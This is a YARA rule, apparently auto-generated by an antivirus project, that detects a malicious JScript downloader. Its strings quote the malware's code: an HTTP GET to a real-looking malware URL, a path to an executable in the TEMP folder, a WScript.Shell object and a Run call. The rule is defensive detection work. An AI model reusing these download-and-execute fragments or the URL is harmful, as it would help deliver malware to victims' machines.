rule sig_20160329_44f48080b9253590c2273296fb5f4675 {
  meta:
    description = "datamaliciousorder - file 20160329_44f48080b9253590c2273296fb5f4675.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "3955267b65e66979134dfa583dfa3d2f530b1dd5f0c925cd695b6603f04b81e6"

  strings:
    $s1  = "j[IR](\"GET\", \"http://caferacerpneus.com.br/lw2osd\", false);" fullword ascii
    $s2  = "function h() {return rh[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"RBxj0ippwQI8ONG.exe\";};" fullword ascii
    $s3  = "for (;;){WScript[HK](VT() * 11); if (j[\"readystate\"] >= 2 * 2) break;};" fullword ascii
    $s4  = "var rh = function u() {return WScript[Ez](\"WScript.Shell\");}(), A0 = 11;" fullword ascii
    $s5  = "function h0(r, Sm0){SV = SV * 1; return r - Sm0;};" fullword ascii
    $s6  = "function Z(){return \"\" + Nr;};" fullword ascii
    $s7  = "function Wk(mP){rh[\"Run\"](mP, SV, SV);};" fullword ascii
    $s8  = "function W() {return ((ac == true) && (ac == v)) ? 1 : SV;};" fullword ascii
    $s9  = "function VT(){return 22;};" fullword ascii
    $s10 = "function V(){return Ez;};" fullword ascii
    $s11 = "return h0(z0, A);" fullword ascii
    $s12 = "function M()" fullword ascii
    $s13 = "function ka(Sm) {var D = (1, 2, 3, 4, 5, Sm); return D;};" fullword ascii
    $s14 = "var Xi = new this[\"Date\"]();" fullword ascii
    $s15 = " while (td){" fullword ascii
    $s16 = "var de = false;" fullword ascii
    $s17 = "var ac = false;" fullword ascii
    $s18 = "v = true; " fullword ascii
    $s19 = "var v = false;" fullword ascii
    $s20 = "ac = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}